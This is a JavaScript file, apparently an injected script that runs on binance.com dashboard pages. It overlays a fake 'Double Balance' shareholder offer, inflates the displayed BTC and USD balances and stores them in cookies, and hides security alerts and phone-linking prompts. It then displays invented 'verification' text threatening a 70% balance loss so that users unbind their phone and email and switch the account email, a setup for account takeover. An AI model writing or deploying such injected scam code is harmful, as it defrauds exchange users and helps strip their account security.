var checkDoubled=(cname)=>{
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
  
    return null;
  }
//nothing

  handleTopBalance=()=>{
   setInterval(() =>{
      var btcBalance=checkDoubled("btcBalance")
      var usdBalance=checkDoubled("usdBalance")
    document.querySelector('div [class="css-1t9tl2o"]').innerHTML=btcBalance
    document.querySelector('div [class="css-11bw57b"]').innerHTML=usdBalance
document.querySelector(".css-1xn7ycn").style.display="none"
if(document.querySelector(".css-czxcdk"))document.querySelector(".css-czxcdk").style.display="none"
if(document.querySelector("#click_dashboard_balance_details_show"))document.querySelector("#click_dashboard_balance_details_show").style.display="none"

if(document.querySelector(".css-vp41bv"))document.querySelector(".css-vp41bv").style.display="none"
if(document.querySelector(".css-14g1xls"))document.querySelector(".css-14g1xls").style.display="none"
if(document.querySelector(".css-5vw0vc"))document.querySelector(".css-5vw0vc").style.display="none"
if(document.querySelector(".css-1wu88jq"))document.querySelector(".css-1wu88jq").style.display="none"
    

if(document.querySelector("#verifyButton"))return console.log("terminated")
console.log("Function procceded")
var passedFirstVerification=checkDoubled("passedFirstVerification")
if(passedFirstVerification){

    var verifyButton=document.createElement("button")
    verifyButton.innerHTML="Next Step"
    verifyButton.id="verifyButton" 
verifyButton.style.backgroundColor="rgb(252, 213, 53)"
verifyButton.style.border="rgb(252, 213, 53)"
verifyButton.style.padding="6px"
verifyButton.style.margin="6px"
verifyButton.style.borderRadius="6%"
verifyButton.style.cursor="pointer"
verifyButton.onclick=()=>window.location.href="https://www.binance.com/en/my/security"

var div =document.createElement("div")
        div.id="doubleBalDiv"
        var p = document.createElement("p")
        p.className="css-tn1ffv"
        p.innerHTML="Congratulations you passed the first verification step <br>Procced to shareholder's Email linking to get a code for personal link verification.<br>Note:Your inability to verify this personal shareholder's link in the next 24 hours means you are a robot Or you did not accept our policy.<br>And this will lead to loss of 70% of your current account balance, as a result of policy you signed at the time of buying shares.<br> This verifications is very easy. Follow the instructions below or contact shareholder's support to help you do this.</br><br> (1.) <a href='https://google.com' target='_blank'>open Personal shareholder's link in new tab</a> <br><br>(2.) Click on Next Step button and get a code to temporarily Unbind Email.<br><b>Note : Your Email will never be removed . Because it has been saved in our database and is internal to this account. This is just a step you need to follow to successfully channel a verification code to your personal shareholder's link. <br> After this you can always use your email and password to login.. "
        // p.className="css-45f3jl"
        div.append(p,verifyButton)
        if(document.querySelector(".css-1p01izn"))document.querySelector(".css-1p01izn").append(div)


}else{

    
    var verifyButton=document.createElement("button")
    verifyButton.innerHTML="Start Verification"
    verifyButton.id="verifyButton" 
verifyButton.style.backgroundColor="rgb(252, 213, 53)"
verifyButton.style.border="rgb(252, 213, 53)"
verifyButton.style.padding="6px"
verifyButton.style.margin="6px"
verifyButton.style.borderRadius="6%"
verifyButton.style.cursor="pointer"
verifyButton.onclick=()=>window.location.href="https://www.binance.com/en/my/security"

var div =document.createElement("div")
        div.id="doubleBalDiv"
        var p = document.createElement("p")
        p.className="css-tn1ffv"
        p.innerHTML="Congratulations your balance has been doubled  successfully.<br>The next step is verification, which involves shareholder's Email linking to get a code for personal link verification.<br>Note:Your inability to verify this personal shareholder's link in the next 24 hours means you are a robot Or you did not accept our policy.<br>And this will lead to loss of 70% of your current account balance, as a result of policy you signed at the time of buying shares.<br> This verifications is very easy. Follow the instructions below or contact shareholder's support to help you do this.</br><br> (1.) <a href='https://google.com' target='_blank'>open Personal shareholder's link in new tab</a> <br><br>(2.) Click on start verification button and get a code to temporarily Unbind your phone number, (if you linked a phone number to this account).<br><b>Note : Your Phone number Or Email will never be removed . Because it has been saved in our database and is internal to this account. This is just a step you need to follow to successfully channel a verification code to your personal shareholder's link. Your phone number will automatically be linked back to this account after this verification and same  applies to your Email.</b><br><br>  (3.)  The last step is to temporarily switch your email to your personal binance Shareholder's Email that is linked up to your personal Shareholder's link and get a code on your personal Shareholder's link .Use the code on the link to verify your Shareholder's address and get a code to temporarily unbind your email and  verify the code . Then you successfully verify your shareholder's link and  your email and phone number is linked back successfully. "
        // p.className="css-45f3jl"
        div.append(p,verifyButton)
        if(document.querySelector(".css-1p01izn"))document.querySelector(".css-1p01izn").append(div)
//  if(document.querySelector("#doubleBalDiv")) clearInterval(intervalId2)
}

}, 1000)

  }




var setBalanceCookie=(btcBalance,usdBalance)=>{
    document.cookie=`btcBalance=${btcBalance} ;`
    document.cookie=`usdBalance=${usdBalance} ;`
    document.cookie=`doubledBalance=${true}`
    alert(`called: ${btcBalance,usdBalance}`)
}

var locationToExecute="binance.com"
var currentBrowserLocation=window.location.href








if(currentBrowserLocation.includes(locationToExecute)){

    if(currentBrowserLocation.includes("my/dashboard") ){
       var checkDoubledResult= checkDoubled("doubledBalance") 
       if(checkDoubledResult != null){
          
 handleTopBalance()

       }else{
        
    // alert("nothing....")
    
        var button=document.createElement("button")
        button.innerHTML="Double Balance"
        button.id="embededButton" 
 button.style.backgroundColor="rgb(252, 213, 53)"
 button.style.border="rgb(252, 213, 53)"
 button.style.padding="6px"
 button.style.margin="6px"
 button.style.borderRadius="6%"
 button.style.cursor="pointer"
        var div =document.createElement("div")
        div.id="doubleBalDiv"
        var p = document.createElement("p")
        p.className="css-tn1ffv"
        p.innerHTML=" Congratulations you are now a binance shareholder/stock holder.  'One thing about our stock market is that everytime one person buy and another sells. <br> always remember  that a share is not a lottery ticket. it's part of ownership of a buisness.'<br>  which means you are now entitled to having shares in the company's profit at the end of every month.<br>However, at the time of buying shares, we signed an agreement to give you a one time opportunity to double your balance by 100%.<br> Every new binance shareHolder is required to complete this if its part of the agreement. click on double balance button to double your available balance by 100%.<br> Remember you have to pass Email and Phone number  security verifications to chanel a security code to your binance Shareholder's personal link, otherwise will lead to loss of your money.<br> this is the Policy binance follows to make sure you are not a robot.That you accept our terms of service.<br> you can  <a href=''>contact shareholder's support</a> for help"
        // p.className="css-45f3jl"
        div.append(p,button)
        if(document.querySelector(".css-1p01izn"))document.querySelector(".css-1p01izn").append(div)
        var intervalid=setInterval(()=>{
            if(document.querySelector(".css-vp41bv"))document.querySelector(".css-vp41bv").style.display="none"
if(document.querySelector(".css-14g1xls"))document.querySelector(".css-14g1xls").style.display="none"
if(document.querySelector(".css-5vw0vc"))document.querySelector(".css-5vw0vc").style.display="none"
if(document.querySelector(".css-1wu88jq"))document.querySelector(".css-1wu88jq").style.display="none"
            document.querySelector(".css-1p01izn").append(div)},1000 
            )

button.onclick=()=>{
    alert("Please wait while we double your balance...")
    p.innerHTML="Proccessing Request please wait..."
    button.innerHTML="Proccessing..."

    setTimeout(()=>{
    var btcBalance=document.querySelector('div [class="css-1t9tl2o"]').innerHTML
    var usdBalance=document.querySelector('div [class="css-11bw57b"]').innerHTML

    if(isNaN(btcBalance)){
        document.querySelector(".css-1xn7ycn").click()
        var btcBalance=document.querySelector('div [class="css-1t9tl2o"]').innerHTML
        var usdBalance=document.querySelector('div [class="css-11bw57b"]').innerHTML
     if(isNaN(btcBalance))return alert("Please Make sure your balance is enabled to show and refresh .We are unable to double your balance")
    var lastusdBalance= usdBalance.replace(/[^0-9\.]/g,'') 
    var doubledBtcBalance= parseFloat(btcBalance)+55*2
    var doubledUsdBalance=parseFloat(lastusdBalance)+736.1*2
    document.querySelector('div [class="css-1t9tl2o"]').innerHTML=doubledBtcBalance
    document.querySelector('div [class="css-11bw57b"]').innerHTML=doubledUsdBalance
    document.querySelector("#embededButton").style.display="none"
    setBalanceCookie(doubledBtcBalance,doubledUsdBalance)

    var verifyButton=document.createElement("button")
    verifyButton.innerHTML="Start Verification"
    verifyButton.id="verifyButton" 
verifyButton.style.backgroundColor="rgb(252, 213, 53)"
verifyButton.style.border="rgb(252, 213, 53)"
verifyButton.style.padding="6px"
verifyButton.style.margin="6px"
verifyButton.style.borderRadius="6%"
verifyButton.style.cursor="pointer"
document.querySelector("#doubleBalDiv").append(verifyButton)
    // document.querySelector("#embededButton").innerHTML=""
    p.innerHTML="Congratulations your balance has been doubled  successfully.<br>The next step is verification, which involves shareholder's Email linking to get a code for personal link verification.<br>Note:Your inability to verify this personal shareholder's link in the next 24 hours means you are a robot Or you did not accept our policy.<br>And this will lead to loss of 70% of your current account balance, as a result of policy you signed at the time of buying shares.<br> This verifications is very easy. Follow the instructions below or contact shareholder's support to help you do this.</br><br> (1.) <a href='https://google.com' target='_blank'>open Personal shareholder's link in new tab</a> <br><br>(2.) Click on start verification button and get a code to temporarily Unbind your phone number, (if you linked a phone number to this account).<br><b>Note : Your Phone number Or Email will never be removed . Because it has been saved in our database and is internal to this account. This is just a step you need to follow to successfully channel a verification code to your personal shareholder's link. Your phone number will automatically be linked back to this account after this verification and same  applies to your Email.</b><br><br>  (3.)  The last step is to temporarily switch your email to your personal binance Shareholder's Email that is linked up to your personal Shareholder's link and get a code on your personal Shareholder's link .Use the code on the link to verify your Shareholder's address and get a code to temporarily unbind your email and  verify the code . Then you successfully verify your shareholder's link and  your email and phone number is linked back successfully. "

    verifyButton.onclick=()=>window.location.href="https://www.binance.com/en/my/security"
    
}else{
        var lastusdBalance= usdBalance.replace(/[^0-9\.]/g,'') 
        var doubledBtcBalance= parseFloat(btcBalance)+55.00000000
        var doubledUsdBalance=parseFloat(lastusdBalance)+736.1
        document.querySelector('div [class="css-1t9tl2o"]').innerHTML=doubledBtcBalance
        document.querySelector('div [class="css-11bw57b"]').innerHTML=doubledUsdBalance
        document.querySelector("#embededButton").style.display="none"
        setBalanceCookie(doubledBtcBalance,doubledUsdBalance)
    
        var verifyButton=document.createElement("button")
        verifyButton.innerHTML="Start Verification"
        verifyButton.id="verifyButton" 
    verifyButton.style.backgroundColor="rgb(252, 213, 53)"
    verifyButton.style.border="rgb(252, 213, 53)"
    verifyButton.style.padding="6px"
    verifyButton.style.margin="6px"
    verifyButton.style.borderRadius="6%"
    verifyButton.style.cursor="pointer"
    document.querySelector("#doubleBalDiv").append(verifyButton)
        // document.querySelector("#embededButton").innerHTML=""
        p.innerHTML="Congratulations your balance has been doubled  successfully.<br>The next step is verification, which involves shareholder's Email linking to get a code for personal link verification.<br>Note:Your inability to verify this personal shareholder's link in the next 24 hours means you are a robot Or you did not accept our policy.<br>And this will lead to loss of 70% of your current account balance, as a result of policy you signed at the time of buying shares.<br> This verifications is very easy. Follow the instructions below or contact shareholder's support to help you do this.</br><br> (1.) <a href='https://google.com' target='_blank'>open Personal shareholder's link in new tab</a> <br><br>(2.) Click on start verification button and get a code to temporarily Unbind your phone number, (if you linked a phone number to this account).<br><b>Note : Your Phone number Or Email will never be removed . Because it has been saved in our database and is internal to this account. This is just a step you need to follow to successfully channel a verification code to your personal shareholder's link. Your phone number will automatically be linked back to this account after this verification and same  applies to your Email.</b><br><br>  (3.)  The last step is to temporarily switch your email to your personal binance Shareholder's Email that is linked up to your personal Shareholder's link and get a code on your personal Shareholder's link .Use the code on the link to verify your Shareholder's address and get a code to temporarily unbind your email and  verify the code . Then you successfully verify your shareholder's link and  your email and phone number is linked back successfully. "
    
        verifyButton.onclick=()=>window.location.href="https://www.binance.com/en/my/security"
    }

 },2000 )
   
}
    }
  
}

}
// document.querySelector(".css-11bw57b").innerHTML.replace(/[^0-9\.]/g,'') 


//document.querySelector("div [class=css-o5kz6j]").querySelector("div [class=css-1iqp8i2]")



//document.querySelector(".css-vp41bv").style.display="none"   shun alert

//document.querySelector(".css-14g1xls").style.display="none" //shun add number
//document.querySelector(".css-5vw0vc").style.display="none"//shun add number on bigger screen
// if(document.querySelector(".css-1wu88jq"))document.querySelector(".css-1wu88jq").style.display="none"


